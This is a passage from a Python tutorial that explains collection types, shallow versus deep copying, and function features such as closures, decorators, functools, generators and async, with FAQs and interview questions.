stats = calculate_stats([1, 2, 3, 3, 4, 5])
print(f"Mean: {stats.mean}, Median: {stats.median}, Mode: {stats.mode}")

# ⚠️ CAUTION: vs dataclasses (Python 3.7+)
# Named tuples: Immutable, no default values, no methods
# Dataclasses: Mutable (unless frozen), default values, custom methods

from dataclasses import dataclass

@dataclass
class User:
    id: int
    name: str
    email: str = "no-email@example.com"  # Default value
  
    def send_email(self, message):  # Custom method
        print(f"Sending to {self.email}: {message}")

user = User(1, 'Alice')
user.send_email("Hello!")
```

#### When to Use Each Collection

```python
# ✅ Use list when:
# - Ordered sequence of elements
# - Need indexing and slicing
# - Frequent append operations
# - Elements can be duplicates

# ✅ Use tuple when:
# - Immutable sequence
# - Heterogeneous data (different types)
# - Dictionary keys or set elements
# - Function returns multiple values

# ✅ Use dict when:
# - Key-value pairs
# - Fast lookups by key
# - Need to associate data

# ✅ Use set when:
# - Unique elements only
# - Fast membership testing
# - Set operations (union, intersection)
# - Remove duplicates

# ✅ Use deque when:
# - Queue (FIFO) or stack (LIFO)
# - Frequent additions/removals from both ends
# - Sliding window, circular buffer

# ✅ Use Counter when:
# - Counting occurrences
# - Frequency analysis
# - Most common elements

# ✅ Use defaultdict when:
# - Grouping data
# - Avoiding KeyError
# - Building nested structures

# ✅ Use OrderedDict when:
# - Need move_to_end() method
# - Order matters in equality
# - LRU cache implementation

# ✅ Use ChainMap when:
# - Multiple dictionaries with priority
# - Configuration hierarchy
# - Nested scopes
```

### Frequently Asked Questions

**Q1: What's the difference between a shallow copy and a deep copy?**

**A:**

```python
import copy

# Shallow copy: Copies structure but not nested objects
original = [[1, 2], [3, 4]]

# Shallow copy methods
shallow1 = original.copy()
shallow2 = original[:]
shallow3 = list(original)
shallow4 = copy.copy(original)

# Modify nested object
shallow1[0][0] = 100

# All shallow copies affected!
print(original)  # [[100, 2], [3, 4]]
print(shallow1)  # [[100, 2], [3, 4]]

# Why: Nested lists are same objects
print(id(original[0]) == id(shallow1[0]))  # True

# Deep copy: Recursively copies all objects
original = [[1, 2], [3, 4]]
deep = copy.deepcopy(original)

deep[0][0] = 100
print(original)  # [[1, 2], [3, 4]] - unchanged
print(deep)  # [[100, 2], [3, 4]]

# Nested lists are different objects
print(id(original[0]) == id(deep[0]))  # False

# ✅ GOOD: Use shallow copy when:
# - Flat structures (no nesting)
# - Performance critical (deep copy is slower)

# ✅ GOOD: Use deep copy when:
# - Nested structures
# - Need complete independence

# ⚠️ CAUTION: Deep copy can be expensive
large_nested = [[list(range(1000)) for _ in range(100)] for _ in range(100)]
# Shallow copy: Fast
shallow = large_nested.copy()
# Deep copy: Slow (copies 10M integers)
deep = copy.deepcopy(large_nested)
```

**Why This Matters:** Incorrect copying is a common source of bugs when working with nested data structures. Understanding shallow vs deep copy prevents unintended modifications.

**Related Concepts:** Object references (Section 1.3), Mutable vs immutable (Section 1.6)

---

**Q2: When should I use a list vs a tuple?**

**A:**

```python
# ✅ Use list for:
# 1. Homogeneous collections (same type)
numbers = [1, 2, 3, 4, 5]
names = ['Alice', 'Bob', 'Charlie']

# 2. Variable-length data
shopping_cart = []
shopping_cart.append('apple')
shopping_cart.append('banana')

# 3. Data that needs modification
scores = [85, 90, 78, 92]
scores[2] = 95  # Update score

# ✅ Use tuple for:
# 1. Heterogeneous collections (different types, fixed structure)
user = ('Alice', 30, 'alice@example.com')  # name, age, email
point = (10.5, 20.3)  # x, y

# 2. Immutable data (constants)
RGB_RED = (255, 0, 0)
DAYS = ('Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun')

# 3. Dictionary keys (tuples are hashable)
locations = {
    (40.7128, -74.0060): 'New York',
    (34.0522, -118.2437): 'Los Angeles',
}

# 4. Function returns (multiple values)
def get_stats():
    return (min_val, max_val, avg_val)

# Performance: Tuples are faster to create and iterate
import timeit

list_creation = timeit.timeit('x = [1, 2, 3, 4, 5]', number=1000000)
tuple_creation = timeit.timeit('x = (1, 2, 3, 4, 5)', number=1000000)

print(f"List: {list_creation:.4f}s")  # ~0.08s
print(f"Tuple: {tuple_creation:.4f}s")  # ~0.02s (4x faster)

# Memory: Tuples use less memory
import sys
lst = [1, 2, 3, 4, 5]
tpl = (1, 2, 3, 4, 5)
print(sys.getsizeof(lst))  # 120 bytes
print(sys.getsizeof(tpl))  # 88 bytes

# ⚠️ CAUTION: Tuple with mutable elements
t = ([1, 2], [3, 4])
t[0].append(5)  # Allowed! Modifying list inside tuple
print(t)  # ([1, 2, 5], [3, 4])

# But can't reassign
try:
    t[0] = [100]  # TypeError
except TypeError:
    print("Can't reassign tuple elements")
```

**Why This Matters:** Choosing the right data structure affects code clarity, performance, and correctness. Lists signal "this data may change," tuples signal "this structure is fixed."

---

**Q3: Why is dict faster than list for lookups?**

**A:**

```python
# List lookup: O(n) - must scan all elements
large_list = list(range(1000000))

# Find element (worst case: at end or not present)
999999 in large_list  # O(n) - scans up to 1M elements

# Dict lookup: O(1) - hash table direct access
large_dict = {i: i for i in range(1000000)}

999999 in large_dict  # O(1) - instant lookup

# Benchmark
import timeit

lst = list(range(10000))
dct = {i: i for i in range(10000)}

# Search for element near end
list_time = timeit.timeit('9999 in lst', globals=globals(), number=10000)
dict_time = timeit.timeit('9999 in dct', globals=globals(), number=10000)

print(f"List: {list_time:.4f}s")  # ~0.5s
print(f"Dict: {dict_time:.4f}s")  # ~0.0002s (2500x faster!)

# How hash tables work:
# 1. Hash function converts key to integer
key = "apple"
hash_value = hash(key)  # -4958814161541840467

# 2. Use hash to find bucket (simplified)
bucket = hash_value % 8  # 1 (for 8 buckets)

# 3. Store/retrieve from bucket (O(1))

# Trade-off: Memory
import sys
lst = list(range(1000))
dct = {i: i for i in range(1000)}
st = set(range(1000))

print(f"List: {sys.getsizeof(lst)} bytes")  # ~9K
print(f"Dict: {sys.getsizeof(dct)} bytes")  # ~41K
print(f"Set: {sys.getsizeof(st)} bytes")  # ~32K

# ✅ GOOD: Use dict/set when:
# - Frequent membership testing
# - Lookups by key
# - Uniqueness required

# ✅ GOOD: Use list when:
# - Memory constrained
# - Need ordering
# - Infrequent searches

# Example: Whitelist checking
allowed_users = {'alice', 'bob', 'charlie', ...}  # 10,000 users

def is_allowed(username):
    return username in allowed_users  # O(1)

# vs
allowed_users = ['alice', 'bob', 'charlie', ...]  # List

def is_allowed(username):
    return username in allowed_users  # O(n) - slow for large lists!
```

**Why This Matters:** Using the wrong data structure for lookups can make code 1000x slower. Hash tables (dict/set) provide O(1) lookups at the cost of more memory.

**Related Concepts:** Hash tables (Section 2.1), Time complexity (Section 4.1)

---

### Interview Questions

**Question 1: What's the output and why?**

```python
a = [1, 2, 3]
b = a
a.append(4)
print(b)
```

**Difficulty:** Junior

**SDLC Relevance:** Development

**Answer:**

```python
# Output: [1, 2, 3, 4]

# Why:
# b = a creates a reference, not a copy
# Both a and b point to the same list object

# Visualization:
# a → [1, 2, 3]
# b → (same list)

# When a.append(4):
# a → [1, 2, 3, 4]
# b → (same list) [1, 2, 3, 4]

# Verify with id():
a = [1, 2, 3]
b = a
print(id(a) == id(b))  # True (same object)

# ✅ GOOD: Create a copy if you need independence
a = [1, 2, 3]
b = a.copy()  # or a[:] or list(a)
a.append(4)
print(b)  # [1, 2, 3] - unchanged

# For nested lists, use deep copy
import copy
a = [[1, 2], [3, 4]]
b = copy.deepcopy(a)
a[0].append(5)
print(b)  # [[1, 2], [3, 4]] - unchanged
```

**Key Points to Mention:**

- Assignment creates references, not copies
- Use `.copy()`, `[:]`, or `list()` for shallow copy
- Use `copy.deepcopy()` for nested structures
- Check identity with `id()` or `is`

**Why This Matters:** Reference vs copy is one of Python's most common sources of bugs. Understanding this prevents unintended modifications.

**Follow-up Questions:**

- How do you create a deep copy? (`copy.deepcopy()`)
- What about for immutable types like tuples? (Assignment is fine since they can't be modified)

**Common Mistakes:**

- Assuming `b = a` creates a copy
- Forgetting about nested structures with shallow copy
- Using `copy.copy()` when `deepcopy()` is needed

---

**Question 2: How would you remove duplicates from a list while preserving order?**

**Difficulty:** Mid-Level

**SDLC Relevance:** Development, Performance Optimization

**Answer:**

```python
numbers = [1, 2, 3, 2, 4, 1, 5, 3, 6]

# ❌ BAD: Set loses order (before Python 3.7, unreliable in 3.7+)
unique = list(set(numbers))  # Order not guaranteed in older Python

# ✅ GOOD (Modern): Dict preserves insertion order (Python 3.7+)
unique = list(dict.fromkeys(numbers))
# [1, 2, 3, 4, 5, 6]

# ✅ GOOD (Universal): Manual tracking
def remove_duplicates(items):
    seen = set()
    result = []
    for item in items:
        if item not in seen:
            seen.add(item)
            result.append(item)
    return result

unique = remove_duplicates(numbers)

# ✅ GOOD: List comprehension (less readable)
seen = set()
unique = [x for x in numbers if not (x in seen or seen.add(x))]
# Exploits: set.add() returns None (falsy)

# Performance comparison:
# dict.fromkeys(): O(n), clean, Pythonic
# Manual with set: O(n), explicit, works everywhere
# List comprehension: O(n), clever but obscure

# For unhashable items (can't use set/dict):
items = [[1, 2], [3, 4], [1, 2], [5, 6]]

def remove_duplicates_unhashable(items):
    result = []
    for item in items:
        if item not in result:  # O(n) per check
            result.append(item)
    return result

# ⚠️ This is O(n²)! Slow for large lists

# ✅ BETTER: Convert to tuple (if items are lists)
def remove_duplicates_tuples(items):
    seen = set()
    result = []
    for item in items:
        key = tuple(item)  # Make hashable
        if key not in seen:
            seen.add(key)
            result.append(item)
    return result
```

**Key Points to Mention:**

1. **dict.fromkeys()**: Modern, clean solution for Python 3.7+
2. **Manual with set**: Explicit, works on all Python versions
3. **Order preservation**: Critical in many applications
4. **Hashability**: Items must be hashable for set/dict approach
5. **Time complexity**: O(n) vs O(n²) for different approaches

**Why This Matters:** Duplicate removal is common in data processing. The right approach balances correctness, performance, and readability.

**Follow-up Questions:**

- How would you do this for a list of dictionaries? (Use frozenset of items() or custom key)
- What's the time complexity? (O(n) with set, O(n²) with list.index)

**Common Mistakes:**

- Using `set()` and assuming order is preserved
- Not handling unhashable types
- O(n²) solution with repeated `in` checks on list

---

### Key Takeaways

**Data Structures:**

- **Lists**: Ordered, mutable, indexed; use for sequences, stacks; O(1) append, O(n) insert/delete
- **Tuples**: Ordered, immutable, hashable; use for heterogeneous data, dict keys, function returns; memory efficient
- **Dicts**: Key-value pairs, O(1) lookup; use for mappings, fast lookups; ordered in Python 3.7+
- **Sets**: Unique elements, O(1) membership; use for deduplication, membership tests, set operations
- **Strings**: Immutable Unicode sequences; use + for occasional concatenation, join() for many; f-strings for formatting
- **deque**: Fast append/pop from both ends; use for queues, circular buffers, sliding windows
- **Counter**: Specialized dict for counting; use for frequency analysis, most common elements
- **defaultdict**: Dict with default values; use for grouping, avoiding KeyError
- **OrderedDict**: Dict with ordering methods; use when move_to_end() needed, order matters in equality
- **ChainMap**: Combine dicts with priority; use for configuration hierarchy, nested scopes

**Performance Characteristics:**

- Hash tables (dict/set): O(1) lookup, more memory
- Lists: O(n) search, less memory, ordered
- Choose based on access patterns and constraints

**Memory Considerations:**

- Lists over-allocate for growth
- Tuples are more memory-efficient
- Sets/dicts use more memory but provide fast lookup
- Shallow vs deep copy affects nested structures

---

## 1.5 Functions

**SDLC Phase:** Development

**Relevant For:**

- [ ] Requirements gathering
- [X] System design (API design, modularity)
- [X] Development
- [X] Testing (unit testing focuses on functions)
- [ ] Deployment
- [X] Maintenance (refactoring)

Functions are reusable blocks of code that perform specific tasks. They are fundamental to writing modular, testable, maintainable code.

### Function Fundamentals

#### Function Definition (def)

```python
# Basic function
def greet(name):
    """Return a greeting message."""
    return f"Hello, {name}!"

# Call function
message = greet("Alice")
print(message)  # "Hello, Alice!"

# Function without return (returns None)
def print_greeting(name):
    print(f"Hello, {name}!")

result = print_greeting("Bob")
print(result)  # None

# Function without parameters
def get_pi():
    return 3.14159

pi = get_pi()
```

#### Parameters and Arguments

```python
# Positional parameters
def add(a, b):
    return a + b

result = add(10, 20)  # 30

# Default arguments
def greet(name, greeting="Hello"):
    return f"{greeting}, {name}!"

greet("Alice")  # "Hello, Alice!"
greet("Bob", "Hi")  # "Hi, Bob!"

# ⚠️ CAUTION: Mutable default arguments (common pitfall!)
def add_item(item, items=[]):  # ❌ BAD!
    items.append(item)
    return items

list1 = add_item(1)  # [1]
list2 = add_item(2)  # [1, 2] - Oops! Should be [2]
# Default list is created ONCE and reused!

# ✅ GOOD: Use None as default
def add_item(item, items=None):
    if items is None:
        items = []
    items.append(item)
    return items

list1 = add_item(1)  # [1]
list2 = add_item(2)  # [2] - Correct!

# Keyword arguments
def create_user(name, age, city="Unknown"):
    return {
        "name": name,
        "age": age,
        "city": city
    }

user1 = create_user("Alice", 30)  # Positional
user2 = create_user(name="Bob", age=25, city="NYC")  # Keyword
user3 = create_user("Charlie", age=35)  # Mixed
```

#### Return Values

```python
# Single return value
def square(x):
    return x ** 2

# Multiple return values (actually returns a tuple)
def get_min_max(numbers):
    return min(numbers), max(numbers)

minimum, maximum = get_min_max([1, 2, 3, 4, 5])
# minimum = 1, maximum = 5

# Early return (guard clauses)
def process_user(user):
    if user is None:
        return None  # Early return
  
    if not user.get('active'):
        return None  # Early return
  
    # Main logic here
    return perform_processing(user)

# ✅ GOOD: Explicit return None
def validate_email(email):
    if '@' not in email:
        return None  # Invalid
    return email  # Valid

# vs implicit return
def validate_email(email):
    if '@' in email:
        return email
    # Implicitly returns None

# Multiple exit points (sometimes OK)
def calculate_discount(amount, customer_type):
    if customer_type == 'VIP':
        return amount * 0.2
    if customer_type == 'PREMIUM':
        return amount * 0.15
    if amount > 1000:
        return amount * 0.1
    return 0  # No discount

# ✅ BETTER: Single exit point (more maintainable)
def calculate_discount(amount, customer_type):
    discount = 0
  
    if customer_type == 'VIP':
        discount = 0.2
    elif customer_type == 'PREMIUM':
        discount = 0.15
    elif amount > 1000:
        discount = 0.1
  
    return amount * discount
```

#### *args and **kwargs

```python
# *args - variable positional arguments (tuple)
def sum_all(*args):
    return sum(args)

result = sum_all(1, 2, 3, 4, 5)  # 15
result = sum_all(10, 20)  # 30

# **kwargs - variable keyword arguments (dict)
def create_user(**kwargs):
    return kwargs

user = create_user(name="Alice", age=30, city="NYC")
# {'name': 'Alice', 'age': 30, 'city': 'NYC'}

# Combining positional, *args, keyword, **kwargs
def complex_function(a, b, *args, option=False, **kwargs):
    print(f"a={a}, b={b}")
    print(f"args={args}")
    print(f"option={option}")
    print(f"kwargs={kwargs}")

complex_function(1, 2, 3, 4, 5, option=True, x=10, y=20)
# a=1, b=2
# args=(3, 4, 5)
# option=True
# kwargs={'x': 10, 'y': 20}

# Parameter order MUST be:
# 1. Positional parameters
# 2. *args
# 3. Keyword-only parameters
# 4. **kwargs

# ✅ GOOD: Wrapper functions
def logged_function(*args, **kwargs):
    print(f"Calling with args={args}, kwargs={kwargs}")
    return actual_function(*args, **kwargs)

# ✅ GOOD: Flexible API
class Database:
    def query(self, sql, *params, **options):
        # params: Query parameters
        # options: Connection options, timeout, etc.
        pass

db.query("SELECT * FROM users WHERE id = ?", 123, timeout=30)
```

#### Argument Unpacking

```python
# Unpack list/tuple as positional arguments
def add(a, b, c):
    return a + b + c

numbers = [1, 2, 3]
result = add(*numbers)  # Same as add(1, 2, 3)

# Unpack dict as keyword arguments
def create_user(name, age, city):
    return {"name": name, "age": age, "city": city}

user_data = {"name": "Alice", "age": 30, "city": "NYC"}
user = create_user(**user_data)  # Same as create_user(name="Alice", age=30, city="NYC")

# ✅ GOOD: Combining unpacking
def process(a, b, c, d=0, e=0):
    return a + b + c + d + e

args = [1, 2, 3]
kwargs = {"d": 4, "e": 5}
result = process(*args, **kwargs)  # 15
```

#### Function Annotations

```python
# Type hints (Python 3.5+)
def greet(name: str) -> str:
    return f"Hello, {name}!"

def add(a: int, b: int) -> int:
    return a + b

# Complex types
from typing import List, Dict, Optional, Union, Tuple

def process_users(users: List[Dict[str, str]]) -> List[str]:
    return [user['name'] for user in users]

def find_user(user_id: int) -> Optional[Dict[str, str]]:
    # Returns dict or None
    return db.get(user_id)

def parse_value(value: str) -> Union[int, float]:
    # Returns either int or float
    try:
        return int(value)
    except ValueError:
        return float(value)

def get_coordinates() -> Tuple[float, float]:
    return (10.5, 20.3)

# Annotations don't enforce types at runtime!
def add(a: int, b: int) -> int:
    return a + b

result = add("hello", "world")  # "helloworld" - No error!

# ✅ GOOD: Use mypy for static type checking
# $ mypy script.py
# error: Argument 1 to "add" has incompatible type "str"; expected "int"

# Annotations for documentation
def complex_function(
    data: List[int],
    threshold: float = 0.5,
    mode: str = 'strict'
) -> Dict[str, List[int]]:
    """
    Process data based on threshold.
  
    Args:
        data: List of integers to process
        threshold: Filtering threshold (0.0 to 1.0)
        mode: Processing mode ('strict' or 'lenient')
  
    Returns:
        Dictionary with 'passed' and 'failed' keys
    """
    pass
```

### Advanced Function Concepts

#### First-Class Functions

```python
# Functions are objects
def greet(name):
    return f"Hello, {name}!"

# Assign to variable
say_hello = greet
print(say_hello("Alice"))  # "Hello, Alice!"

# Store in data structures
functions = [greet, print, len]

# Pass as argument
def apply_function(func, value):
    return func(value)

result = apply_function(str.upper, "hello")  # "HELLO"

# Return from function
def get_multiplier(factor):
    def multiply(x):
        return x * factor
    return multiply

double = get_multiplier(2)
triple = get_multiplier(3)

print(double(5))  # 10
print(triple(5))  # 15
```

#### Higher-Order Functions

```python
# Functions that take functions as arguments
def apply_operation(numbers, operation):
    return [operation(n) for n in numbers]

def square(x):
    return x ** 2

def cube(x):
    return x ** 3

numbers = [1, 2, 3, 4, 5]
squared = apply_operation(numbers, square)  # [1, 4, 9, 16, 25]
cubed = apply_operation(numbers, cube)  # [1, 8, 27, 64, 125]

# Built-in higher-order functions
numbers = [1, 2, 3, 4, 5]

# map()
squared = list(map(lambda x: x**2, numbers))

# filter()
evens = list(filter(lambda x: x % 2 == 0, numbers))

# reduce()
from functools import reduce
total = reduce(lambda acc, x: acc + x, numbers, 0)  # 15

# ✅ GOOD: Use comprehensions (more Pythonic)
squared = [x**2 for x in numbers]
evens = [x for x in numbers if x % 2 == 0]
total = sum(numbers)
```

#### Lambda Functions

```python
# Lambda: Anonymous function
square = lambda x: x ** 2
print(square(5))  # 25

# Multiple arguments
add = lambda a, b: a + b
print(add(10, 20))  # 30

# ✅ GOOD: Lambda in higher-order functions
users = [
    {"name": "Alice", "age": 30},
    {"name": "Bob", "age": 25},
    {"name": "Charlie", "age": 35},
]

# Sort by age
sorted_users = sorted(users, key=lambda u: u["age"])

# Filter adults
adults = list(filter(lambda u: u["age"] >= 18, users))

# ❌ BAD: Complex lambdas
result = lambda x: x**2 if x > 0 else -x**2 if x < 0 else 0
# Hard to read!

# ✅ GOOD: Use def for complex logic
def process_value(x):
    if x > 0:
        return x ** 2
    elif x < 0:
        return -(x ** 2)
    else:
        return 0

# ❌ BAD: Assigning lambda to variable
square = lambda x: x ** 2  # PEP 8 violation

# ✅ GOOD: Use def instead
def square(x):
    return x ** 2

# ✅ GOOD: Lambda use cases
# 1. Sorting keys
data.sort(key=lambda x: x[1])

# 2. Map/filter
squared = map(lambda x: x**2, numbers)

# 3. Event handlers (GUI)
button.onclick = lambda: handle_click(button_id)
```

#### Closures and Scope (LEGB Rule)

```python
# LEGB: Local, Enclosing, Global, Built-in

# Built-in scope
print(len([1, 2, 3]))  # len is built-in

# Global scope
global_var = "global"

def outer():
    # Enclosing scope
    enclosing_var = "enclosing"
  
    def inner():
        # Local scope
        local_var = "local"
      
        # Access all scopes
        print(local_var)      # local
        print(enclosing_var)  # enclosing
        print(global_var)     # global
        print(len([1, 2]))    # built-in
  
    inner()

outer()

# Closure: Inner function captures enclosing scope
def make_counter():
    count = 0  # Captured by closure
  
    def increment():
        nonlocal count  # Modify enclosing variable
        count += 1
        return count
  
    return increment

counter1 = make_counter()
counter2 = make_counter()

print(counter1())  # 1
print(counter1())  # 2
print(counter2())  # 1 (separate closure)

# Without nonlocal (error)
def broken_counter():
    count = 0
  
    def increment():
        count += 1  # UnboundLocalError!
        return count
  
    return increment

# ✅ GOOD: Closure for data encapsulation
def create_account(initial_balance):
    balance = initial_balance
  
    def deposit(amount):
        nonlocal balance
        balance += amount
        return balance
  
    def withdraw(amount):
        nonlocal balance
        if amount > balance:
            raise ValueError("Insufficient funds")
        balance -= amount
        return balance
  
    def get_balance():
        return balance
  
    return {
        'deposit': deposit,
        'withdraw': withdraw,
        'balance': get_balance
    }

account = create_account(1000)
account['deposit'](500)  # 1500
account['withdraw'](200)  # 1300
print(account['balance']())  # 1300

# Global keyword
count = 0

def increment_global():
    global count  # Modify global variable
    count += 1

increment_global()
print(count)  # 1

# ⚠️ CAUTION: Avoid global variables
# Makes code hard to test and reason about
# Use function parameters and return values instead
```

#### Decorators (Function Decorators)

```python
# Decorator: Function that modifies another function
def uppercase_decorator(func):
    def wrapper(*args, **kwargs):
        result = func(*args, **kwargs)
        return result.upper()
    return wrapper

@uppercase_decorator
def greet(name):
    return f"hello, {name}!"

print(greet("alice"))  # "HELLO, ALICE!"

# Equivalent to:
def greet(name):
    return f"hello, {name}!"

greet = uppercase_decorator(greet)

# Multiple decorators (applied bottom-up)
def bold(func):
    def wrapper(*args, **kwargs):
        return f"<b>{func(*args, **kwargs)}</b>"
    return wrapper

def italic(func):
    def wrapper(*args, **kwargs):
        return f"<i>{func(*args, **kwargs)}</i>"
    return wrapper

@bold
@italic
def greet(name):
    return f"Hello, {name}!"

print(greet("Alice"))  # "<b><i>Hello, Alice!</i></b>"

# Decorator with arguments
def repeat(times):
    def decorator(func):
        def wrapper(*args, **kwargs):
            return [func(*args, **kwargs) for _ in range(times)]
        return wrapper
    return decorator

@repeat(times=3)
def greet(name):
    return f"Hello, {name}!"

print(greet("Alice"))  # ['Hello, Alice!', 'Hello, Alice!', 'Hello, Alice!']

# ✅ GOOD: Timing decorator
import time
from functools import wraps

def timing_decorator(func):
    @wraps(func)  # Preserves function metadata
    def wrapper(*args, **kwargs):
        start = time.time()
        result = func(*args, **kwargs)
        end = time.time()
        print(f"{func.__name__} took {end - start:.4f}s")
        return result
    return wrapper

@timing_decorator
def slow_function():
    time.sleep(1)
    return "Done"

# ✅ GOOD: Logging decorator
import functools

def log_calls(func):
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        args_repr = [repr(a) for a in args]
        kwargs_repr = [f"{k}={v!r}" for k, v in kwargs.items()]
        signature = ", ".join(args_repr + kwargs_repr)
        print(f"Calling {func.__name__}({signature})")
        result = func(*args, **kwargs)
        print(f"{func.__name__} returned {result!r}")
        return result
    return wrapper

@log_calls
def add(a, b):
    return a + b

# ✅ GOOD: Caching decorator
from functools import lru_cache

@lru_cache(maxsize=128)
def fibonacci(n):
    if n < 2:
        return n
    return fibonacci(n-1) + fibonacci(n-2)

# Cached - much faster for repeated calls
print(fibonacci(100))
```

#### functools Module

```python
from functools import wraps, partial, lru_cache, reduce, singledispatch

# wraps - Preserves function metadata in decorators
def my_decorator(func):
    @wraps(func)  # Copy __name__, __doc__, etc.
    def wrapper(*args, **kwargs):
        return func(*args, **kwargs)
    return wrapper

# partial - Partial function application
def power(base, exponent):
    return base ** exponent

square = partial(power, exponent=2)
cube = partial(power, exponent=3)

print(square(5))  # 25
print(cube(5))  # 125

# ✅ GOOD: Partial for callbacks
from functools import partial

def handle_click(button_id, event):
    print(f"Button {button_id} clicked: {event}")

# Create specialized handlers
button1_handler = partial(handle_click, "button1")
button2_handler = partial(handle_click, "button2")

button1_handler("click")  # "Button button1 clicked: click"

# lru_cache - Least Recently Used cache
@lru_cache(maxsize=128)
def expensive_function(n):
    print(f"Computing for {n}")
    time.sleep(1)
    return n ** 2

expensive_function(5)  # "Computing for 5" (takes 1s)
expensive_function(5)  # Returns instantly (cached)
expensive_function(10)  # "Computing for 10" (takes 1s)

# Cache info
print(expensive_function.cache_info())
# CacheInfo(hits=1, misses=2, maxsize=128, currsize=2)

# Clear cache
expensive_function.cache_clear()

# reduce - Cumulative operation
from functools import reduce

numbers = [1, 2, 3, 4, 5]
total = reduce(lambda acc, x: acc + x, numbers, 0)  # 15
product = reduce(lambda acc, x: acc * x, numbers, 1)  # 120

# singledispatch - Function overloading
@singledispatch
def process(arg):
    print(f"Default: {arg}")

@process.register(int)
def _(arg):
    print(f"Processing int: {arg * 2}")

@process.register(str)
def _(arg):
    print(f"Processing string: {arg.upper()}")

@process.register(list)
def _(arg):
    print(f"Processing list of {len(arg)} items")

process(42)  # "Processing int: 84"
process("hello")  # "Processing string: HELLO"
process([1, 2, 3])  # "Processing list of 3 items"
```

#### Generator Functions (yield)

```python
# Generator function with yield
def count_up_to(n):
    count = 1
    while count <= n:
        yield count
        count += 1

# Returns generator object
counter = count_up_to(5)

# Iterate over generator
for num in counter:
    print(num)  # 1, 2, 3, 4, 5

# Or use next()
counter = count_up_to(3)
print(next(counter))  # 1
print(next(counter))  # 2
print(next(counter))  # 3
print(next(counter))  # StopIteration

# ✅ GOOD: Memory-efficient file reading
def read_large_file(file_path):
    with open(file_path) as f:
        for line in f:
            yield line.strip()

# Process huge file without loading into memory
for line in read_large_file('huge_file.txt'):
    process(line)

# ✅ GOOD: Infinite sequences
def fibonacci():
    a, b = 0, 1
    while True:
        yield a
        a, b = b, a + b

fib = fibonacci()
for _ in range(10):
    print(next(fib))  # 0, 1, 1, 2, 3, 5, 8, 13, 21, 34

# ✅ GOOD: Pipeline processing
def read_file(filename):
    with open(filename) as f:
        for line in f:
            yield line

def filter_errors(lines):
    for line in lines:
        if 'ERROR' in line:
            yield line

def extract_timestamp(lines):
    for line in lines:
        yield line.split()[0]

# Pipeline
timestamps = extract_timestamp(filter_errors(read_file('log.txt')))
for ts in timestamps:
    print(ts)

# Generator expressions (covered in Section 1.3)
squares = (x**2 for x in range(10))
```

#### Coroutines (async/await)

```python
# Basic async function
async def fetch_data():
    await asyncio.sleep(1)  # Simulate I/O
    return "Data"

# ⚠️ Can't call async function directly
# result = fetch_data()  # Returns coroutine object

# ✅ GOOD: Use asyncio.run()
import asyncio

async def main():
    result = await fetch_data()
    print(result)

asyncio.run(main())

# Multiple concurrent tasks
async def fetch_user(user_id):
    await asyncio.sleep(1)
    return f"User {user_id}"

async def main():
    # Sequential (slow - 3 seconds)
    user1 = await fetch_user(1)
    user2 = await fetch_user(2)
    user3 = await fetch_user(3)
  
    # Concurrent (fast - 1 second)
    results = await asyncio.gather(
        fetch_user(1),
        fetch_user(2),
        fetch_user(3)
    )

# More details in Section 2.5 (Asynchronous Programming)
```

### Function Internals

#### Function Objects

```python
def greet(name):
    """Return a greeting."""
    return f"Hello, {name}!"

# Function attributes
print(greet.__name__)  # 'greet'
print(greet.__doc__)  # 'Return a greeting.'
print(greet.__module__)  # '__main__'
print(greet.__code__)  # Code object

# Add custom attributes
greet.version = "1.0"
greet.author = "Alice"

print(greet.version)  # "1.0"
```

#### Code Objects

```python
def add(a, b):
    return a + b

code = add.__code__

# Code object attributes
print(code.co_name)  # 'add'
print(code.co_argcount)  # 2
print(code.co_varnames)  # ('a', 'b')
print(code.co_code)  # Bytecode
print(code.co_filename)  # File where function defined

# Disassemble bytecode
import dis
dis.dis(add)
# Output:
#   2           0 LOAD_FAST                0 (a)
#               2 LOAD_FAST                1 (b)
#               4 BINARY_ADD
#               6 RETURN_VALUE
```

#### Frame Objects

```python
import sys

def outer():
    def inner():
        frame = sys._getframe()  # Current frame
        print(f"Function: {frame.f_code.co_name}")
        print(f"Locals: {frame.f_locals}")
        print(f"Line: {frame.f_lineno}")
    inner()

outer()
```

#### Call Stack

```python
import traceback

def func_c():
    traceback.print_stack()

def func_b():
    func_c()

def func_a():
    func_b()

func_a()
# Prints call stack:
#   File "...", line ..., in <module>
#     func_a()
#   File "...", line ..., in func_a
#     func_b()
#   File "...", line ..., in func_b
#     func_c()
#   File "...", line ..., in func_c
#     traceback.print_stack()
```

#### Recursion and Recursion Limits

```python
import sys

# Default recursion limit
print(sys.getrecursionlimit())  # 1000 (typically)

# Recursive function
def factorial(n):
    if n <= 1:
        return 1
    return n * factorial(n - 1)

print(factorial(5))  # 120

# Too deep recursion
try:
    factorial(2000)  # RecursionError
except RecursionError:
    print("Recursion limit exceeded!")

# Change limit (use with caution!)
sys.setrecursionlimit(3000)

# ✅ BETTER: Iterative solution
def factorial_iterative(n):
    result = 1
    for i in range(2, n + 1):
        result *= i
    return result

# ✅ GOOD: Tail recursion (not optimized in Python)
def factorial_tail(n, accumulator=1):
    if n <= 1:
        return accumulator
    return factorial_tail(n - 1, n * accumulator)

# Python doesn't optimize tail calls, but some problems
# are naturally recursive
def binary_search(arr, target, low, high):
    if low > high:
        return -1
  
    mid = (low + high) // 2
  
    if arr[mid] == target:
        return mid
    elif arr[mid] < target:
        return binary_search(arr, target, mid + 1, high)
    else:
        return binary_search(arr, target, low, mid - 1)
```

### Frequently Asked Questions

**Q1: What's the difference between arguments and parameters?**

**A:**

```python
# Parameters: Variables in function definition
def greet(name, greeting):  # 'name' and 'greeting' are parameters
    return f"{greeting}, {name}!"

# Arguments: Values passed when calling function
result = greet("Alice", "Hello")  # "Alice" and "Hello" are arguments

# Types of parameters:
def example(
    pos1, pos2,              # Positional parameters
    *args,                   # Variable positional (*args)
    kw1, kw2="default",      # Keyword-only parameters
    **kwargs                 # Variable keyword (**kwargs)
):
    pass

# Positional arguments
example(1, 2, kw1=3)

# Keyword arguments
example(pos1=1, pos2=2, kw1=3, kw2=4)

# Mixed
example(1, 2, kw1=3, kw2=4)

# Python 3.8+: Positional-only parameters
def divide(a, b, /):  # '/' marks end of positional-only
    return a / b

divide(10, 2)  # OK
divide(a=10, b=2)  # TypeError!

# Python 3.0+: Keyword-only parameters
def greet(name, *, greeting="Hello"):  # '*' forces keyword-only
    return f"{greeting}, {name}!"

greet("Alice", greeting="Hi")  # OK
